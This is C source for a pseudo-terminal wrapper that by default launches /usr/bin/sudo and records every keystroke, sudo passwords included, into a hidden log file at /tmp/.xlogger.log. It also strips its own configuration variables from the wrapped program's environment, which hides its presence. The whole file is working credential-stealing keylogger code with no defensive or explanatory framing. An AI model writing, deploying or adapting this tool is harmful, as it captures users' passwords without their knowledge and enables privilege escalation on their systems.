#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <termios.h>

#ifdef __APPLE__
#include <util.h>
#else
#include <pty.h>
#include <utmp.h>
#endif

#define DEFAULT_XPROGRAM "/usr/bin/sudo"
#define DEFAULT_XLOGFILE "/tmp/.xlogger.log"
#define BUFFER_SIZE 4096
#define INPUT_LINE_BUFFER_SIZE 1024

// 1是记录 0是不记录
// 是否记录键盘 默认记录
static int log_keyboard_input = 1;

// 是否记录终端的输出 默认不记录
static int log_console_output = 0;

static struct termios original_termios;
static int master_fd = -1;
static FILE *log_fp = NULL;
static pid_t child_pid = -1;
static char input_line_buffer[INPUT_LINE_BUFFER_SIZE];
static size_t input_line_pos = 0;

static const char *target_program = NULL;
static const char *log_file_path = NULL;

extern char **environ;



void flush_input_line(void) {
    if (input_line_pos > 0 && log_fp && log_keyboard_input) {
        time_t now;
        struct tm *tm_info;
        char timestamp[32];
        
        time(&now);
        tm_info = localtime(&now);
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
        
        fprintf(log_fp, "[%s] INPUT: ", timestamp);
        
        for (size_t i = 0; i < input_line_pos; i++) {
            unsigned char c = input_line_buffer[i];
            if (c >= 32 && c <= 126) {
                fputc(c, log_fp);
            } else if (c == '\t') {
                fputs("\\t", log_fp);
            } else {
                fprintf(log_fp, "\\x%02x", c);
            }
        }
        
        fputc('\n', log_fp);
        fflush(log_fp);
        
        input_line_pos = 0;
    }
}

void cleanup(void) {
    flush_input_line();
    
    if (log_fp) {
        fclose(log_fp);
    }
    
    if (master_fd >= 0) {
        close(master_fd);
    }
    
    tcsetattr(STDIN_FILENO, TCSANOW, &original_termios);
}

void signal_handler(int sig) {
    if (child_pid > 0) {
        kill(child_pid, sig);
    }
    cleanup();
    exit(0);
}

void log_input(const char *data, size_t len) {
    if (!log_keyboard_input) return;
    
    for (size_t i = 0; i < len; i++) {
        unsigned char c = data[i];
        
        if (c == '\n' || c == '\r') {
            flush_input_line();
        } else {
            if (input_line_pos < INPUT_LINE_BUFFER_SIZE - 1) {
                input_line_buffer[input_line_pos++] = c;
            } else {
                flush_input_line();
                if (input_line_pos < INPUT_LINE_BUFFER_SIZE - 1) {
                    input_line_buffer[input_line_pos++] = c;
                }
            }
        }
    }
}

void log_output(const char *data, size_t len) {
    if (!log_fp || !log_console_output) return;
    
    time_t now;
    struct tm *tm_info;
    char timestamp[32];
    
    time(&now);
    tm_info = localtime(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
    
    fprintf(log_fp, "[%s] OUTPUT: ", timestamp);
    
    for (size_t i = 0; i < len; i++) {
        unsigned char c = data[i];
        if (c >= 32 && c <= 126) {
            fputc(c, log_fp);
        } else if (c == '\n') {
            fputs("\\n", log_fp);
        } else if (c == '\r') {
            fputs("\\r", log_fp);
        } else if (c == '\t') {
            fputs("\\t", log_fp);
        } else {
            fprintf(log_fp, "\\x%02x", c);
        }
    }
    
    fputc('\n', log_fp);
    fflush(log_fp);
}

char **create_filtered_environ(void) {
    int env_count = 0;
    int filtered_count = 0;
    
    // 计算环境变量总数
    while (environ[env_count] != NULL) {
        env_count++;
    }
    
    // 分配新的环境变量数组
    char **new_environ = malloc((env_count + 1) * sizeof(char *));
    if (!new_environ) {
        return NULL;
    }
    
    // 复制环境变量，排除XPROGRAM和XLOGFILE
    for (int i = 0; i < env_count; i++) {
        if (strncmp(environ[i], "XPROGRAM=", 9) != 0 && 
            strncmp(environ[i], "XLOGFILE=", 9) != 0) {
            new_environ[filtered_count] = strdup(environ[i]);
            if (!new_environ[filtered_count]) {
                // 内存分配失败，清理已分配的内存
                for (int j = 0; j < filtered_count; j++) {
                    free(new_environ[j]);
                }
                free(new_environ);
                return NULL;
            }
            filtered_count++;
        }
    }
    
    new_environ[filtered_count] = NULL;
    return new_environ;
}

void free_environ(char **env) {
    if (!env) return;
    
    for (int i = 0; env[i] != NULL; i++) {
        free(env[i]);
    }
    free(env);
}

int setup_terminal(void) {
    struct termios new_termios;
    
    // 检查 STDIN 是否是一个真实的终端
    if (!isatty(STDIN_FILENO)) {
        // 不是终端设备，跳过终端设置
        return 0;
    }
    
    if (tcgetattr(STDIN_FILENO, &original_termios) < 0) {
        perror("tcgetattr");
        return -1;
    }
    
    new_termios = original_termios;
    cfmakeraw(&new_termios);
    
    if (tcsetattr(STDIN_FILENO, TCSANOW, &new_termios) < 0) {
        perror("tcsetattr");
        return -1;
    }
    
    return 0;
}

int create_pty_and_fork(char **argv) {
    int slave_fd;
    
    if (openpty(&master_fd, &slave_fd, NULL, NULL, NULL) < 0) {
        perror("openpty");
        return -1;
    }
    
    child_pid = fork();
    if (child_pid < 0) {
        perror("fork");
        close(master_fd);
        close(slave_fd);
        return -1;
    }
    
    if (child_pid == 0) {
        close(master_fd);
        
        if (login_tty(slave_fd) < 0) {
            perror("login_tty");
            _exit(1);
        }
        
        char **filtered_env = create_filtered_environ();
        if (filtered_env) {
            execve(target_program, argv, filtered_env);
            free_environ(filtered_env);
        } else {
            // 如果过滤环境变量失败，回退到使用原始环境变量
            execve(target_program, argv, environ);
        }
        perror("execve/execv");
        _exit(1);
    }
    
    close(slave_fd);
    return 0;
}

void io_loop(void) {
    fd_set read_fds;
    char buffer[BUFFER_SIZE];
    ssize_t bytes_read;
    int max_fd = (STDIN_FILENO > master_fd) ? STDIN_FILENO : master_fd;
    
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(STDIN_FILENO, &read_fds);
        FD_SET(master_fd, &read_fds);
        
        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
            if (errno == EINTR) continue;
            perror("select");
            break;
        }
        
        if (FD_ISSET(STDIN_FILENO, &read_fds)) {
            bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer));
            if (bytes_read <= 0) break;
            
            log_input(buffer, bytes_read);
            
            if (write(master_fd, buffer, bytes_read) != bytes_read) {
                if (errno != EPIPE && errno != EIO) {
                    perror("write to master");
                }
                break;
            }
        }
        
        if (FD_ISSET(master_fd, &read_fds)) {
            bytes_read = read(master_fd, buffer, sizeof(buffer));
            if (bytes_read <= 0) break;
            
            log_output(buffer, bytes_read);
            
            if (write(STDOUT_FILENO, buffer, bytes_read) != bytes_read) {
                perror("write to stdout");
                break;
            }
        }
    }
}

int main(int argc, char *argv[]) {
    int status;
    
    // 优先从环境变量获取配置
    target_program = getenv("XPROGRAM");
    if (!target_program) {
        target_program = DEFAULT_XPROGRAM;
    }
    
    log_file_path = getenv("XLOGFILE");
    if (!log_file_path) {
        log_file_path = DEFAULT_XLOGFILE;
    }
    
    log_fp = fopen(log_file_path, "a");
    if (!log_fp) {
        perror("fopen log file");
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGQUIT, signal_handler);
    atexit(cleanup);
    
    if (setup_terminal() < 0) {
        return 1;
    }
    
    if (create_pty_and_fork(argv) < 0) {
        return 1;
    }
    
    fprintf(log_fp, "\n========= New session started ======\n");
    fprintf(log_fp, "cmdline: %s", target_program);
    for (int i = 1; i < argc; i++) {
        fprintf(log_fp, " %s", argv[i]);
    }
    fprintf(log_fp, "\n====================================\n");
    fflush(log_fp);
    
    io_loop();
    
    waitpid(child_pid, &status, 0);
    
    fprintf(log_fp, "=== Session ended with status: %d ===\n\n", 
            WIFEXITED(status) ? WEXITSTATUS(status) : -1);
    fflush(log_fp);
    
    return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
}